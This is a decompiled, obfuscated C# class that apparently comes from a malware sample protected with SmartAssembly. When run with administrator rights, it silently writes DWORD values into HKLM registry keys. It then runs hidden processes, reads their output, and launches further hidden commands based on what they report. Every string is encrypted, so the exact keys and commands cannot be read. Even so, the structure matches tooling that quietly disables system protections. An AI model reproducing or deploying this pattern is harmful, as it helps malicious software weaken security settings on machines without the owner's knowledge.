using System;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace WEoqBCtavg;

public static class XrEpWkagQbnU
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void SICnLABDubXDMn()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			lHKKzWwQjqDh(getString_0(107370784), getString_0(107370723), getString_0(107396673));
			lHKKzWwQjqDh(getString_0(107370730), getString_0(107370669), getString_0(107396690));
			lHKKzWwQjqDh(getString_0(107371156), getString_0(107371035), getString_0(107396690));
			lHKKzWwQjqDh(getString_0(107371156), getString_0(107371030), getString_0(107396690));
			lHKKzWwQjqDh(getString_0(107371156), getString_0(107370993), getString_0(107396690));
			WvjJzhLTyzrbu();
		}
	}

	private static void lHKKzWwQjqDh(string string_0, string string_1, string string_2)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(string_1) != string_2)
			{
				registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void WvjJzhLTyzrbu()
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107358787),
			Arguments = getString_0(107370956),
			UseShellExecute = false,
			RedirectStandardOutput = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
		while (!process2.StandardOutput.EndOfStream)
		{
			string text = process2.StandardOutput.ReadLine();
			if (text.StartsWith(getString_0(107370919)) && text.EndsWith(getString_0(107370338)))
			{
				YPXsGLTVWY(getString_0(107370329));
			}
			else if (text.StartsWith(getString_0(107371035)) && text.EndsWith(getString_0(107370338)))
			{
				YPXsGLTVWY(getString_0(107370292));
			}
			else if (text.StartsWith(TwRTxDxfshC.czGbdVLSgBt(getString_0(107370223))) && text.EndsWith(getString_0(107370338)))
			{
				YPXsGLTVWY(TwRTxDxfshC.czGbdVLSgBt(getString_0(107370146)));
			}
			else if (text.StartsWith(getString_0(107370601)) && text.EndsWith(getString_0(107370338)))
			{
				YPXsGLTVWY(TwRTxDxfshC.czGbdVLSgBt(getString_0(107370572)));
			}
			else if (text.StartsWith(TwRTxDxfshC.czGbdVLSgBt(getString_0(107370459))) && text.EndsWith(getString_0(107370338)))
			{
				YPXsGLTVWY(TwRTxDxfshC.czGbdVLSgBt(getString_0(107370426)));
			}
			else if (text.StartsWith(TwRTxDxfshC.czGbdVLSgBt(getString_0(107369869))) && text.EndsWith(getString_0(107370338)))
			{
				YPXsGLTVWY(TwRTxDxfshC.czGbdVLSgBt(getString_0(107369756)));
			}
			else if (text.StartsWith(TwRTxDxfshC.czGbdVLSgBt(getString_0(107369631))) && text.EndsWith(getString_0(107370338)))
			{
				YPXsGLTVWY(TwRTxDxfshC.czGbdVLSgBt(getString_0(107370130)));
			}
			else if (text.StartsWith(TwRTxDxfshC.czGbdVLSgBt(getString_0(107370009))) && text.EndsWith(getString_0(107370338)))
			{
				YPXsGLTVWY(TwRTxDxfshC.czGbdVLSgBt(getString_0(107369948)));
			}
			else if (text.StartsWith(TwRTxDxfshC.czGbdVLSgBt(getString_0(107369363))) && text.EndsWith(getString_0(107370338)))
			{
				YPXsGLTVWY(TwRTxDxfshC.czGbdVLSgBt(getString_0(107369322)));
			}
			else if (text.StartsWith(TwRTxDxfshC.czGbdVLSgBt(getString_0(107369209))) && !text.EndsWith(getString_0(107396620)))
			{
				YPXsGLTVWY(TwRTxDxfshC.czGbdVLSgBt(getString_0(107369200)));
			}
			else if (text.StartsWith(TwRTxDxfshC.czGbdVLSgBt(getString_0(107369603))) && !text.EndsWith(getString_0(107396673)))
			{
				YPXsGLTVWY(TwRTxDxfshC.czGbdVLSgBt(getString_0(107369574)));
			}
			else if (text.StartsWith(TwRTxDxfshC.czGbdVLSgBt(getString_0(107369545))) && !text.EndsWith(getString_0(107369468)))
			{
				YPXsGLTVWY(TwRTxDxfshC.czGbdVLSgBt(getString_0(107369463)));
			}
			else if (text.StartsWith(TwRTxDxfshC.czGbdVLSgBt(getString_0(107369370))) && !text.EndsWith(getString_0(107369468)))
			{
				YPXsGLTVWY(TwRTxDxfshC.czGbdVLSgBt(getString_0(107368841)));
			}
			else if (text.StartsWith(TwRTxDxfshC.czGbdVLSgBt(getString_0(107368752))) && !text.EndsWith(getString_0(107369468)))
			{
				YPXsGLTVWY(TwRTxDxfshC.czGbdVLSgBt(getString_0(107368675)));
			}
			else if (text.StartsWith(TwRTxDxfshC.czGbdVLSgBt(getString_0(107368630))) && !text.EndsWith(getString_0(107369468)))
			{
				YPXsGLTVWY(TwRTxDxfshC.czGbdVLSgBt(getString_0(107369061)));
			}
		}
	}

	public static void YPXsGLTVWY(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107358787),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	static XrEpWkagQbnU()
	{
		Strings.CreateGetStringDelegate(typeof(XrEpWkagQbnU));
	}
}
